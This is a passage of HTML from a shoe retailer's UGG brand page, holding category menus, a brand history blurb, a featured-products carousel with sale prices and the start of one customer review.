												<li><a href="/the-north-face-clothing.htm">The North Face</a></li>
												
												<li><a href="/clothing-all.htm">Shop All Brands</a></li>
												
											</ul>
											
										</div><!--end col_1-->
										
										<div class="col_1">
											<h3>More Categories</h3>
											<ul>
												
												<li><a href="/new.htm">New</a></li>
												
												<li><a href="/discount.htm">Sale</a></li>
												
											</ul>
											
										</div><!--end col_1-->
										
									</div><!--end sub_menu.hoverable-content-->
									
								</li>
								
								<li id="header-nav-Bags" class="nav_item has_sub enhanced">
									<a href="/bags.htm" class="cat">
										Bags
									</a>
									
									<div class="sub_menu dropdown_4columns">
										<div class="flyoutTopDivider"></div>
										
										<div class="col_1">
											<h3>Shop by Category</h3>
											<ul>
												
												<li><a href="/mens-bags.htm">Men</a></li>
												
												<li><a href="/womens-bags.htm">Women</a></li>
												
												<li><a href="/kids-bags.htm">Kids</a></li>
												
												<li><a href="/backpacks.htm">Backpacks</a></li>
												
												<li><a href="/briefcases.htm">Briefcases</a></li>
												
												<li><a href="/computer.htm">Computer</a></li>
												
												<li><a href="/duffels.htm">Duffels</a></li>
												
												<li><a href="/handbags.htm">Handbags</a></li>
												
												<li><a href="/luggage.htm">Luggage</a></li>
												
												<li><a href="/bags-all.htm">Shop All Categories</a></li>
												
											</ul>
											
										</div><!--end col_1-->
										
										<div class="col_1">
											<h3>Shop by Occasion</h3>
											<ul>
												
												<li><a href="/back-to-school-bags.htm">Back to School</a></li>
												
												<li><a href="/evening-bags.htm">Evening</a></li>
												
												<li><a href="/travel-bags.htm">Travel</a></li>
												
											</ul>
											
										</div><!--end col_1-->
										
										<div class="col_1">
											<h3>Shop by Brand</h3>
											<ul>
												
												<li><a href="/anuschka-womens-bags-all.htm">Anuschka</a></li>
												
												<li><a href="/baggallini-bags-all.htm">Baggallini</a></li>
												
												<li><a href="/calpak-bags-all.htm">CalPak</a></li>
												
												<li><a href="/eagle-creek-bags-all.htm">Eagle Creek</a></li>
												
												<li><a href="/jansport-bags-all.htm">JanSport</a></li>
												
												<li><a href="/ogio-bags.htm">OGIO</a></li>
												
												<li><a href="/patagonia-bags-all.htm">Patagonia</a></li>
												
												<li><a href="/the-north-face-bags-all.htm">The North Face</a></li>
												
												<li><a href="/the-sak-bags.htm">The SAK</a></li>
												
												<li><a href="/timbuk2-bags-all.htm">Timbuk2</a></li>
												
												<li><a href="/bags-all.htm">Shop All Brands</a></li>
												
											</ul>
											
										</div><!--end col_1-->
										
										<div class="col_1">
											<h3>More Categories</h3>
											<ul>
												
												<li><a href="/new-bags.htm">New</a></li>
												
												<li><a href="/discount-bags.htm">Sale</a></li>
												
											</ul>
											
										</div><!--end col_1-->
										
									</div><!--end sub_menu.hoverable-content-->
									
								</li>
								
								<li id="header-nav-Accessories" class="nav_item has_sub enhanced">
									<a href="/accessories.htm" class="cat">
										Accessories
									</a>
									
									<div class="sub_menu dropdown_4columns">
										<div class="flyoutTopDivider"></div>
										
										<div class="col_1">
											<h3>Shop by Category</h3>
											<ul>
												
												<li><a href="/mens-accessories.htm">Men</a></li>
												
												<li><a href="/womens-accessories.htm">Women</a></li>
												
												<li><a href="/kids-accessories.htm">Kids</a></li>
												
												<li><a href="/belts.htm">Belts</a></li>
												
												<li><a href="/eyewear.htm">Eyewear</a></li>
												
												<li><a href="/insoles.htm">Insoles</a></li>
												
												<li><a href="/jewelry.htm">Jewelry</a></li>
												
												<li><a href="/shoe-care.htm">Shoe Care</a></li>
												
												<li><a href="/wallets.htm">Wallets</a></li>
												
												<li><a href="/watches.htm">Watches</a></li>
												
												<li><a href="/accessories.htm">Shop All Categories</a></li>
												
											</ul>
											
										</div><!--end col_1-->
										
										<div class="col_1">
											<h3>Shop by Occasion</h3>
											<ul>
												
												<li><a href="/beach-accessories.htm">Beach</a></li>
												
												<li><a href="/business-accessories.htm">Business</a></li>
												
												<li><a href="/ipad.htm">iPad</a></li>
												
												<li><a href="/iphone.htm">iPhone</a></li>
												
												<li><a href="/travel-accessories.htm">Travel</a></li>
												
											</ul>
											
										</div><!--end col_1-->
										
										<div class="col_1">
											<h3>Shop by Brand</h3>
											<ul>
												
												<li><a href="/bosca-accessories-all.htm">Bosca</a></li>
												
												<li><a href="/buxton-accessories.htm">Buxton</a></li>
												
												<li><a href="/s.jsp/r_prof/br_Casio/mt_101">Casio</a></li>
												
												<li><a href="/jessica-simpson-accessories-all.htm">Jessica Simpson</a></li>
												
												<li><a href="/johnston-murphy-accessories-all.htm">Johnston & Murphy</a></li>
												
												<li><a href="/spenco-accessories-all.htm">Spenco</a></li>
												
												<li><a href="/steve-madden-accessories-all.htm">Steve Madden</a></li>
												
												<li><a href="/superfeet-accessories.htm">Superfeet</a></li>
												
												<li><a href="/tommy-bahama-accessories-all.htm">Tommy Bahama</a></li>
												
												<li><a href="/trafalgar-accessories-all.htm">Trafalgar</a></li>
												
												<li><a href="/accessories-all.htm">Shop All Brands</a></li>
												
											</ul>
											
										</div><!--end col_1-->
										
										<div class="col_1">
											<h3>More Categories</h3>
											<ul>
												
												<li><a href="/new-accessories.htm">New</a></li>
												
												<li><a href="/discount-accessories.htm">Sale</a></li>
												
												<li><a href="/organizers.htm">Organizers</a></li>
												
												<li><a href="/small-leather.htm">Small Leather</a></li>
												
											</ul>
											
										</div><!--end col_1-->
										
									</div><!--end sub_menu.hoverable-content-->
									
								</li>
								
								<li id="header-nav-New" class="nav_item ">
									<a href="/new.htm" class="cat">
										New
									</a>
									
								</li>
								
								<li id="header-nav-Sale" class="nav_item ">
									<a href="/sale.htm" class="cat">
										Sale
									</a>
									
								</li>
								
							</ul>
						</nav>
						<div class="my_cart">
							<div class="cart_amount">
								<a >My Cart (<span id="cartqty" class="cartCnt">0</span>)</a>
							</div>
							<div class="cart_action">
								<a href="#" class="cart button disabled"><span>Checkout</span></a>
							</div>
						</div><!-- /div.my_cart-->
					</header><!-- /header.hdr_cont-->
				</div>
			</div>
		</div><!-- /div.main_nav-->
		<!-- END LOGO/NAV -->

		<div id="advSrchMainDiv" class="advSrchMainDiv" style="display:none"></div>
		
		
		<div class="container_24">
			<div class="grid_24">
			<div id="pbar">
				



<script type="text/javascript" src="/jscript/pb_20121204.js"></script>
<script type="text/javascript">
var pbarIHeight = 'auto'; var pbarIBackground = 'url(/images/promobar_bkgd.gif)'; var pbarHeight = 'auto'; setupPbar('/pbar');
</script>

			</div>
			</div><!--end grid_24 -->
		</div><!--end container_24-->
		
		
		<div class="container_24">
		

<!-- BEGIN MAIN CONTENT -->
<div class="content_area">
<div class="container_24">

<!-- left column -->





<div class="grid_5 left_sidebar_home">
<nav class="sidebar">

	<section class="rewards">
		<div class="text">
			<a class="bottom-text rewards-savings-link" href="/info/rewards"
				title="Learn more about Rewards">Shoebuy Rewards</a>
			<hr />
			<a class="rewards-target-link top-text reward-long" href="/info/rewards"
				title="Learn more about Rewards">Learn More</a>
		</div>
	</section><!-- /section.rewards -->

		
<section>

<header class="title">
	<h2>Shoes</h2>
</header><!-- /h2.title -->
<ul class="links">
<li class="markif">
	<a href='/womens-shoes.htm' title='Women's Shoes'>Women's Shoes</a>
</li>
<li class="markif">
	<a href='/mens-shoes.htm' title='Men's Shoes'>Men's Shoes</a>
</li>
<li class="markif">
	<a href='/kids-shoes.htm' title='Kids Shoes'>Kids Shoes</a>
</li>
<li class="callout">
	<h3>Shop By</h3>
<ul class="sub_hed">
<li class="mark1"><a href="/new-shoe-styles.htm" title="New Shoes">New Shoes</a></li>
<li class="mark1"><a href="/sale.htm" title="Sale Shoes">Sale Shoes</a></li>
</ul><!-- /div.sub_hed -->
</li>
<li class="markif">
	<a href='/all-shoes-categories.htm' title='All Shoes Categories'>All Shoes Categories</a>
</li>
</ul><!-- /div.links -->
</section>
<section>

<header class="title">
	<h2>Clothing</h2>
</header><!-- /h2.title -->
<ul class="links">
<li class="markif">
	<a href='/athletic-apparel.htm' title='Active Wear'>Active Wear</a>
</li>
<li class="markif">
	<a href='/hats.htm' title='Hats'>Hats</a>
</li>
<li class="markif">
	<a href='/outerwear.htm' title='Outerwear'>Outerwear</a>
</li>
<li class="markif">
	<a href='/shirts-tops.htm' title='Shirts & Tops'>Shirts & Tops</a>
</li>
<li class="markif">
	<a href='/socks.htm' title='Socks'>Socks</a>
</li>
<li class="callout">
	<h3>Shop By</h3>
<ul class="sub_hed">
<li class="mark1"><a href="/clothing-new.htm" title="New Clothing">New Clothing</a></li>
<li class="mark1"><a href="/discount-clothing.htm" title="Sale Clothing">Sale Clothing</a></li>
</ul><!-- /div.sub_hed -->
</li>
<li class="markif">
	<a href='/all-clothing-categories.htm' title='All Clothing Categories'>All Clothing Categories</a>
</li>
</ul><!-- /div.links -->
</section>
<section>

<header class="title">
	<h2>Bags</h2>
</header><!-- /h2.title -->
<ul class="links">
<li class="markif">
	<a href='/backpacks.htm' title='Backpacks'>Backpacks</a>
</li>
<li class="markif">
	<a href='/briefcases.htm' title='Business Cases'>Business Cases</a>
</li>
<li class="markif">
	<a href='/duffels.htm' title='Duffels'>Duffels</a>
</li>
<li class="markif">
	<a href='/handbags.htm' title='Handbags'>Handbags</a>
</li>
<li class="markif">
	<a href='/luggage.htm' title='Luggage'>Luggage</a>
</li>
<li class="callout">
	<h3>Shop By</h3>
<ul class="sub_hed">
<li class="mark1"><a href="/bags-new.htm" title="New Bags">New Bags</a></li>
<li class="mark1"><a href="/discount-bags.htm" title="Sale Bags">Sale Bags</a></li>
</ul><!-- /div.sub_hed -->
</li>
<li class="markif">
	<a href='/all-bags-categories.htm' title='All Bags Categories'>All Bags Categories</a>
</li>
</ul><!-- /div.links -->
</section>
<section>

<header class="title">
	<h2>Accessories</h2>
</header><!-- /h2.title -->
<ul class="links">
<li class="markif">
	<a href='/belts.htm' title='Belts'>Belts</a>
</li>
<li class="markif">
	<a href='/eyewear.htm' title='Eyewear'>Eyewear</a>
</li>
<li class="markif">
	<a href='/insoles.htm' title='Insoles'>Insoles</a>
</li>
<li class="markif">
	<a href='/jewelry.htm' title='Jewelry'>Jewelry</a>
</li>
<li class="markif">
	<a href='/shoe-care.htm' title='Shoe Care'>Shoe Care</a>
</li>
<li class="markif">
	<a href='/watches.htm' title='Watches'>Watches</a>
</li>
<li class="callout">
	<h3>Shop By</h3>
<ul class="sub_hed">
<li class="mark1"><a href="/accessories-new.htm" title="New Accessories">New Accessories</a></li>
<li class="mark1"><a href="/discount-accessories.htm" title="Sale Accessories">Sale Accessories</a></li>
</ul><!-- /div.sub_hed -->
</li>
<li class="markif">
	<a href='/all-accessories-categories.htm' title='All Accessories Categories'>All Accessories Categories</a>
</li>
</ul><!-- /div.links -->
</section>
<!-- boxcounter -->
<section>
	<ul>
<li id="home-confidence" class="box">
Shop with confidence. Shoebuy is brought to you by the same company that brings you these great brands. <img src="/images/confidence2.gif"/>
</li>
	</ul>
</section>


</nav><!-- /nav.sidebar-->
</div>




<div class="grid_19 main_content">





<div class="grid_19 breadcrumb_area">

    <div class="back"><a href="">Back</a></div>
    <div class="breadcrumbs"><a href="/" class="breadcrumbtext">Home</a> &gt; <a href="/all-brands.htm" class="breadcrumbtext">All Brands</a> &gt;&nbsp;UGG</div>


</div><!--end breadcrumb_area-->





<!-- TODO : BRAND PAGE ONLY -->







	
<div class="brandTitleBlk clearfix">
	
		<div class="brand-logo"><img src="/images/brand/default_logo/logo2_18826.gif"></div>
	
	<div class="brand-info">
		<h1>UGG</h1>
    	<div id="ba1"></div>
	</div><!--end brand-info-->
</div><!--end title-->
<script type="text/javascript"> document.getElementById('ba1').innerHTML='<p>The roots of UGG Australia can be traced back to the sandy beaches of Byron Bay, where Australian surfers began wearing sheepskin footwear for warmth between sessions. In the late 1960\'s and early...</p><p><a href="#more" class="more">More</a></p>'; </script>

<div id="facebook_like_logoabout" style="margin-top:-15px;"><fb:like href="http://www.shoebuy.com/ugg.htm" ref="fb-like" show_faces="true" layout="standard" ></fb:like>
</div>


<br class="wPaddingBottom">






<!-- Flexslider with or without ads -->

<!-- If there are side ads, add class "wAds"
	i.e. <div class="carousel slide wAds" id="shop_slider">

    If there are no side ads, remove class "wAds"
    i.e. <div class="carousel slide" id="shop_slider
    Also remove the entire <div class="sliderSideAdsDiv wAds"> at the bottom
-->


<div class="carousel slide wAds" id="shop_slider">
    <ol class="carousel-indicators">
        <li data-target="#shop_slider" data-slide-to="0"></li>
    </ol>
    <div class="carousel-inner">
        <div class="item">
            <!--
                NOTE: Replace href value with proper URL and the background:url with the location of the image file:
                e.g. style="background:url('/images/brand/<my-image-file-name>.jpg')
                For this to work correctly in IE7, you must use the style attribute and not an <img> tag
            -->
            <a href="/ugg-all.htm"><div class="imgCont" style="background:url('/images/brand/bp-slider-bg-ugg-classic.jpg') no-repeat top left;}"></div></a>
            <div class="carousel-caption">
                <span class="overlay-text">UGG Style</span>
                <a href="/ugg-all.htm" class="button">Shop All UGG</a>
            </div>
        </div>
    </div><!--end carousel-inner-->
</div><!--end home_slider-->
<!-- replace below <a> tag and <img> tag with proper link and image file data -->
<div class="sliderSideAdsDiv wAds">
    <a href="/ugg-classic-shoes.htm" title=""><img src="/images/brand/UGG_media_ads_top_35_years.jpg"></a>
    <a href="/ugg-womens-slippers.htm" title=""><img class="last" src="/images/brand/UGG_media_ads_bottom_womens_slippers.jpg"></a>
</div>




<div class="clearfix wPaddingBottom"></div>

<!-- QUICK LINKS -->

<div class="quick-links">
	<h3>Quick Links:</h3>
	<ul class="callout">
		
		<li><a href="/ugg-womens.htm">Women</a></li>
		
		<li><a href="/ugg-mens.htm">Men</a></li>
		
		<li><a href="/ugg-kids.htm">Kids</a></li>
		
		<li><a href="/ugg-classic-shoes.htm">Classics</a></li>
		
		<li><a href="/ugg-clothing.htm">Loungewear</a></li>
		
		<li><a href="/ugg-shoe-care-kits.htm">Shoe Care</a></li>
		
	</ul>
</div><!--end quick-links-->


<!-- TODO: LIFESTYLE ONLY: FEATURED CATEGORIES MAIN (NO SIDEBAR) -->

<!-- FEATURED CATEGORIES MAIN (RT SIDEBAR) -->
<div class="featShopBlk noSideBar clearfix">
	
	
	<h2 class="wLine">Shop UGG</h2>
	<div class="body">
		
		

<div class="shoe-grid legacy" style="
  width: 751px;
">
    <ul class="clearfix">
        <li style="
          width: 235px;
          height: 150px;
          margin-right: 11px;
        ">
            <div><a href="/ugg-accessories.htm" class="shoe-image" style="
                   width: 235px;
                   height: 150px;
                ">
                  <img src="/images/brand/UGG_1_accessories.jpg" height="150" width="235">
                </a>
               </div>
             <div class="shoe-floor"></div>
        </li>
        <li style="
          width: 235px;
          height: 150px;
          margin-right: 11px;
          margin-left: 11px;
        ">
            <div><a href="/ugg-winter-boots.htm" class="shoe-image" style="
                   width: 235px;
                   height: 150px;
                ">
                  <img src="/images/brand/UGG_2_winter.jpg">
                </a>
               </div>
             <div class="shoe-floor"></div>
            <span class="category-title"></span>
        </li>
        <li class="last" style="
          width: 235px;
          height: 150px;
          margin-left: 11px;
        ">
            <div><a href="/ugg-mens-slippers.htm" class="shoe-image" style="
                   width: 235px;
                   height: 150px;
                ">
                  <img src="/images/brand/UGG_3_mens_slippers.jpg">
                </a>
               </div>
             <div class="shoe-floor"></div>
            <span class="category-title"></span>
        </li>
    </ul>
</div><!--end shoe-grid-->

		
	 </div> <!-- end div.body -->
	 
	 
		 	
	<div class="catList">
		<div class="inner">
	    <h2>UGG by Category</h2>
	        <ul>
	            
	                <li><a href="/ugg-above-the-ankle-boots.htm">Above the Ankle Boots</a></li>
	                
	                <li><a href="/ugg-ankle-boots.htm">Ankle Boots</a></li>
	                
	                <li><a href="/ugg-apres-ski-boots.htm">Apres Ski Boots</a></li>
	                
	                <li><a href="/ugg-bailey-button.htm">Bailey Button</a></li>
	                
	                <li><a href="/ugg-boots.htm">Boots</a></li>
	                
	                <li><a href="/ugg-buttons.htm">Buttons</a></li>
	                
	                <li><a href="/ugg-casual-shoes.htm">Casual Shoes</a></li>
	                
		                </ul>
		                <ul>
		                
	                <li><a href="/ugg-classic-boots.htm">Classic Boots</a></li>
	                
	                <li><a href="/ugg-classic-short.htm">Classic Short</a></li>
	                
	                <li><a href="/ugg-classic-tall.htm">Classic Tall</a></li>
	                
	                <li><a href="/ugg-comfort-boots.htm">Comfort Boots</a></li>
	                
	                <li><a href="/ugg-fur-collar.htm">Fur Collar</a></li>
	                
	                <li><a href="/ugg-mid-calf-boots.htm">Mid Calf Boots</a></li>
	                
	                <li><a href="/ugg-pull-on-boots.htm">Pull On Boots</a></li>
	                
		                </ul>
		                <ul>
		                
	                <li><a href="/ugg-sheepskin.htm">Sheepskin</a></li>
	                
	                <li><a href="/ugg-sheepskin-boots.htm">Sheepskin Boots</a></li>
	                
	                <li><a href="/ugg-sheepskin-slippers.htm">Sheepskin Slippers</a></li>
	                
	                <li><a href="/ugg-short.htm">Short</a></li>
	                
	                <li><a href="/ugg-slippers.htm">Slippers</a></li>
	                
	                <li><a href="/ugg-tall.htm">Tall</a></li>
	                
	                <li><a href="/ugg-tall-boots.htm">Tall Boots</a></li>
	                
		                </ul>
		                <ul>
		                
	                <li><a href="/new-ugg-shoes.htm" class="highlight">New</a></li>
	                
	                <li><a href="/discount-ugg-shoes.htm" class="highlight">Sale</a></li>
	                
	                <li><a href="/ugg-shoes.htm" class="highlight">View All</a></li>
	                
	    </ul>
		</div><!--end inner-->
	</div><!--end catList-->

	 
	 
</div><!--end featShopBlock-->


<!-- SEARCH FORM BASIC BLOCK -->





<div class="in_page_search grid_19">
    <div class="text">Can't find what you're looking for?</div>
    <div class="srch_holder">
        <div class="srch_box">
            <form id="searchform" name="search" method="get" action="/s.jsp">
                <input type="search" class="srch_text" name="Search" maxlength="50" id="search" value="" placeholder="Enter Search"/>
                <button id="searchbtn" name="submit" class="search button"><span>Search</span></button>
            </form>
        </div><!--end srch_box-->
        <div class="advanced_srch_link text_link">
            <a id="advanced_srch_link_lower" class="scroll" href="/s.jsp/r_a" data-open="#advSrchMainDiv">Advanced Search</a>
        </div>
    </div><!--end srch_holder-->
</div><!--end in_page_search grid_19-->


<!-- TODO : BRAND PAGE ONLY -->
<!-- BRAND FEATURED COLLECTIONS -->



<!-- FEATURED CATEGORIES SUB (2col) -->
<div class="featured-categories-wrapper-sub clearfix">
	
	<div class="featured-categories-col">
		<h2> Accessories</h2>
		<div class="featured-categories-small">
			
			
			<div class="featured-brands-text clearfix">
				<h2> Accessories by Category</h2>
				<ul>
					
					<li><a href="/ugg-beanies.htm">Beanies</a></li>
					
					<li><a href="/ugg-bucket-hats.htm">Bucket Hats</a></li>
					
					<li><a href="/ugg-button.htm">Button</a></li>
					
					<li><a href="/ugg-cable-knit.htm">Cable Knit</a></li>
					
					<li><a href="/ugg-deerskin.htm">Deerskin</a></li>
					
					<li><a href="/ugg-ear-muffs.htm">Ear Muffs</a></li>
					
					<li><a href="/ugg-fingerless-gloves.htm">Fingerless Gloves</a></li>
					
					<li><a href="/ugg-gloves.htm">Gloves</a></li>
					
					<li><a href="/ugg-hats.htm">Hats</a></li>
					
					<li><a href="/ugg-headphones.htm">Headphones</a></li>
					
					<li><a href="/ugg-knit.htm">Knit</a></li>
					
					<li><a href="/ugg-mittens.htm">Mittens</a></li>
					
				</ul>
				<ul>
					
					<li><a href="/ugg-polyester.htm">Polyester</a></li>
					
					<li><a href="/ugg-pom-pom.htm">Pom Pom</a></li>
					
					<li><a href="/ugg-shearling.htm">Shearling</a></li>
					
					<li><a href="/ugg-sheepskin.htm">Sheepskin</a></li>
					
					<li><a href="/ugg-touch-screen-gloves.htm">Touch Screen Gloves</a></li>
					
					<li><a href="/ugg-winter.htm">Winter</a></li>
					
					<li><a href="/ugg-winter-hats.htm">Winter Hats</a></li>
					
					<li><a href="/ugg-winter-headwear.htm">Winter Headwear</a></li>
					
					<li><a href="/new-ugg-accessories.htm"class="highlight">New</a></li>
					
					<li><a href="/discount-ugg-accessories.htm"class="highlight">Sale</a></li>
					
					<li><a href="/ugg-accessories.htm"class="highlight">View All</a></li>
					
				</ul>
			</div><!--end featured-brands-text-->
			
		</div><!--end featured-categories -->
	</div><!--end featured-categories-col-->
	
	<div class="featured-categories-col">
		<h2> Bags</h2>
		<div class="featured-categories-small">
			
			<div class="featured-brands-text cleafix">
				<h2> Bags by Category</h2>
				<ul>
					
					<li><a href="/ugg-casual-handbags.htm">Casual Handbags</a></li>
					
					<li><a href="/ugg-clutches.htm">Clutches</a></li>
					
					<li><a href="/ugg-fur.htm">Fur</a></li>
					
					<li><a href="/ugg-furry.htm">Furry</a></li>
					
					<li><a href="/ugg-hobo-handbags.htm">Hobo Handbags</a></li>
					
					<li><a href="/ugg-leather.htm">Leather</a></li>
					
					<li><a href="/ugg-medium-handbags.htm">Medium Handbags</a></li>
					
					<li><a href="/ugg-outlet.htm">Outlet</a></li>
					
					<li><a href="/ugg-purses.htm">Purses</a></li>
					
					<li><a href="/ugg-quinn.htm">Quinn</a></li>
					
					<li><a href="/ugg-sheepskin.htm">Sheepskin</a></li>
					
				</ul>
				<ul>
					
					<li><a href="/ugg-shoulder-bags.htm">Shoulder Bags</a></li>
					
					<li><a href="/ugg-small-handbags.htm">Small Handbags</a></li>
					
					<li><a href="/ugg-suede.htm">Suede</a></li>
					
					<li><a href="/ugg-top-handle.htm">Top Handle</a></li>
					
					<li><a href="/ugg-top-zip.htm">Top Zip</a></li>
					
					<li><a href="/ugg-tote-bags.htm">Tote Bags</a></li>
					
					<li><a href="/ugg-tote-handbags.htm">Tote Handbags</a></li>
					
					<li><a href="/new-ugg-bags.htm"class="highlight">New</a></li>
					
					<li><a href="/discount-ugg-bags.htm"class="highlight">Sale</a></li>
					
					<li><a href="/ugg-bags.htm"class="highlight">View All</a></li>
					
				</ul>
			</div><!--end featured-brands-text-->
			
		</div><!--end featured-categories-small -->
	</div><!--end featured-categories-col-->
	
</div><!--end featured-categories-wrapper-sub-->









<a name="more"></a>

<div class="logoabout clearfix">
<table border="0" cellspacing="0" cellpadding="0" width="100%"><tr>
<td width="93" align="center">

  <img src="/images/brand/default_logo/logo2_18826.gif" align="left">

</td>
<td align="right" style="padding-left:10px;"><div id="ba1" align="left" class="logobarblurb">The roots of <a href="/ugg-australia.htm">UGG Australia</a> can be traced back to the sandy beaches of Byron Bay, where Australian surfers began wearing <a href="/sheepskin-shoes.htm">sheepskin footwear</a> for warmth between sessions. In the late 1960's and early 70's surfers first discovered this area and came in small bands to ride the unique waves. They would stay for weeks on end, and during these stays, many looked for ways to keep their feet warm and dry. Because of an abundance of sheepskin in Australia, the surfers often turned to hand-made basic sheepskin "footies" for natural warmth, <a href="/comfort.htm">comfort</a> and to wick away moisture. It was here that the foundation was laid for a brand that would later become a worldwide phenomenon. In 1978, Brian Smith, the company's founder, landed in Southern California with a bag of sheepskin boots and hope. So he founded the UGG brand, began selling his sheepskin boots and they were an immediate sensation. The UGG brand began to symbolize those who embraced sport and a relaxed, active lifestyle. More than that, an emotional connection and a true feeling of love began to grow for <a href="/ugg-boots.htm">UGG boots</a>, just as Brian had envisioned. The evolution of UGG from a brand that made sheepskin boots, <a href="/slippers.htm">slippers</a>, <a href="/clogs.htm">clogs</a> and <a href="/sandals.htm">sandals</a> for an active, <a href="/outdoor.htm">outdoor</a> lifestyle to a brand that was now being touted as a symbol of a stylish, <a href="/casual-shoes.htm">casual</a> and luxurious lifestyle was swift. Today, as a fashion brand, UGG advertisements now graced the pages of Vogue Magazine as well as other fashion books. What started as a niche item, <a href="/ugg-sheepskin-boots.htm">UGG sheepskin boots</a> were now a must-have staple in everyone's wardrobe.</div>
</tr></table>
</div>


<div id="facebook_like_logoabout clearfix"><fb:like href="http://www.shoebuy.com/ugg.htm" ref="fb-like" show_faces="true" layout="standard" ></fb:like>
</div>
<br class="wPaddingBottom">




		
<!-- FEATURED PRODUCTS -->

	
<div class="featured_products_holder notWideCarousel">
	
	<div class="home_section_header">
		<div class="title">Featured Products</div>
		<div class="pagination" id="featured_pag"></div>
		<div class="clear"></div>
	</div>
	
	<div class="carousel slide" id="featured_carousel">
		<ol class="carousel-indicatorsshowPaging">
		</ol>
		<div class="carousel-inner">
			<div class="item">
			
				<div class="span3">
					<div class="product_image">
						<a href="/ugg-classic-tall/484365" title="UGG Classic Tall"><img src="/pi/decke/lg/decke484365_355163_lg.jpg"/></a>
					</div>
					<div class="product_shadow"></div>
					<div class="product_brand">
						<a href="/ugg-classic-tall/484365">UGG</a>
					</div>
					<div class="product_name">
						<a href="/ugg-classic-tall/484365">Classic Tall</a>
					</div>
					<div class="product_price">
					<span class="sale">$195.00 - $28</span> $139.95 - $194.95 <span class="percentOff">up to 28% off</span>
					</div>
				</div>
			
				<div class="span3">
					<div class="product_image">
						<a href="/ugg-lucianna/502883" title="UGG Lucianna"><img src="/pi/decke/lg/decke502883_262584_lg.jpg"/></a>
					</div>
					<div class="product_shadow"></div>
					<div class="product_brand">
						<a href="/ugg-lucianna/502883">UGG</a>
					</div>
					<div class="product_name">
						<a href="/ugg-lucianna/502883">Lucianna</a>
					</div>
					<div class="product_price">
					<span class="sale">$94.95</span> $82.95 <span class="percentOff">13% off</span>
					</div>
				</div>
			
				<div class="span3">
					<div class="product_image">
						<a href="/ugg-lucianna-stripe/690553" title="UGG Lucianna Stripe"><img src="/pi/decke/lg/decke690553_89139_lg.jpg"/></a>
					</div>
					<div class="product_shadow"></div>
					<div class="product_brand">
						<a href="/ugg-lucianna-stripe/690553">UGG</a>
					</div>
					<div class="product_name">
						<a href="/ugg-lucianna-stripe/690553">Lucianna Stripe</a>
					</div>
					<div class="product_price">
					<span class="sale">$150.00</span> $119.95 <span class="percentOff">20% off</span>
					</div>
				</div>
			
			</div>
			<div class="item">
			
				<div class="span3">
					<div class="product_image">
						<a href="/ugg-bailey-button-triplet/484509" title="UGG Bailey Button Triplet"><img src="/pi/decke/lg/decke484509_89139_lg.jpg"/></a>
					</div>
					<div class="product_shadow"></div>
					<div class="product_brand">
						<a href="/ugg-bailey-button-triplet/484509">UGG</a>
					</div>
					<div class="product_name">
						<a href="/ugg-bailey-button-triplet/484509">Bailey Button Triplet</a>
					</div>
					<div class="product_price">
					$219.95
					</div>
				</div>
			
				<div class="span3">
					<div class="product_image">
						<a href="/ugg-yia-yia/502877" title="UGG Yia Yia"><img src="/pi/decke/lg/decke502877_262565_lg.jpg"/></a>
					</div>
					<div class="product_shadow"></div>
					<div class="product_brand">
						<a href="/ugg-yia-yia/502877">UGG</a>
					</div>
					<div class="product_name">
						<a href="/ugg-yia-yia/502877">Yia Yia</a>
					</div>
					<div class="product_price">
					$25.45
					</div>
				</div>
			
				<div class="span3">
					<div class="product_image">
						<a href="/ugg-fluffie/484317" title="UGG Fluffie"><img src="/pi/decke/lg/decke484317_252809_lg.jpg"/></a>
					</div>
					<div class="product_shadow"></div>
					<div class="product_brand">
						<a href="/ugg-fluffie/484317">UGG</a>
					</div>
					<div class="product_name">
						<a href="/ugg-fluffie/484317">Fluffie</a>
					</div>
					<div class="product_price">
					<span class="sale">$35.00</span> $27.95 <span class="percentOff">20% off</span>
					</div>
				</div>
			
			</div>
			<div class="item">
			
				<div class="span3">
					<div class="product_image">
						<a href="/ugg-classic-short/484449" title="UGG Classic Short"><img src="/pi/decke/lg/decke484449_356519_lg.jpg"/></a>
					</div>
					<div class="product_shadow"></div>
					<div class="product_brand">
						<a href="/ugg-classic-short/484449">UGG</a>
					</div>
					<div class="product_name">
						<a href="/ugg-classic-short/484449">Classic Short</a>
					</div>
					<div class="product_price">
					<span class="sale">$154.95 - $155.00</span> $108.95 - $154.95 <span class="percentOff">up to 30% off</span>
					</div>
				</div>
			
				<div class="span3">
					<div class="product_image">
						<a href="/ugg-elyza/502910" title="UGG Elyza"><img src="/pi/decke/lg/decke502910_262405_lg.jpg"/></a>
					</div>
					<div class="product_shadow"></div>
					<div class="product_brand">
						<a href="/ugg-elyza/502910">UGG</a>
					</div>
					<div class="product_name">
						<a href="/ugg-elyza/502910">Elyza</a>
					</div>
					<div class="product_price">
					<span class="sale">$67.95</span> $47.95 <span class="percentOff">29% off</span>
					</div>
				</div>
			
				<div class="span3">
					<div class="product_image">
						<a href="/ugg-taya/484404" title="UGG Taya"><img src="/pi/decke/lg/decke484404_252804_lg.jpg"/></a>
					</div>
					<div class="product_shadow"></div>
					<div class="product_brand">
						<a href="/ugg-taya/484404">UGG</a>
					</div>
					<div class="product_name">
						<a href="/ugg-taya/484404">Taya</a>
					</div>
					<div class="product_price">
					<span class="sale">$60.00</span> $29.95 <span class="percentOff">50% off</span>
					</div>
				</div>
			
			</div>
		</div>
		<a href="#featured_carousel" class="carousel-control left" data-slide="prev"></a>
		<a href="#featured_carousel" class="carousel-control right" data-slide="next"></a>
	</div>
</div>

<script language="javascript">
    $(function(){sbApp.Session.storeContinueShoppingUrl(); })
</script>





				
<!-- REVIEWS -->


<div class="review_list">
    <h2 class="title">Reviews</h2>

    <div class="single-review clearfix">
        <div class="product-reviewed">
			<div class="rating"><span class="star50 stars_rating"></span></div>
            <a href="/ugg-mireya/502897" class="image"><img src="/pi/decke/xs/decke502897_89139_xs.jpg"/></a>
            <div class="shoe-floor"></div>
            <a href="/ugg-mireya/502897" class="name">UGG Mireya</a>
            <span class="price">$52.95</span>
        </div><!--end product-reviewed-->
        <div class="review">
			<div class="header">
            	<div class="title"> UGG Mireya </div> 
				<div class="custInfo">
					By Diane G., from Brooklyn, NY | July 11, 2014
				</div>
			</div><!--end header-->
            <p class="message">Such a well made shoe (leather upper and bottom). Definitely a sandal that is made to last. Very comfortable.</p>
            
            <div class="helpful">
                <form name="h835191" action="/s.jsp" method="post">
                    <p>Was this review helpful to you? <button type="submit" class="product button" name="rhelp.x">Yes</button><button type="submit" class="product button" name="rnohelp.x">No</button>
                    <input type="hidden" name="Style" value="502897">
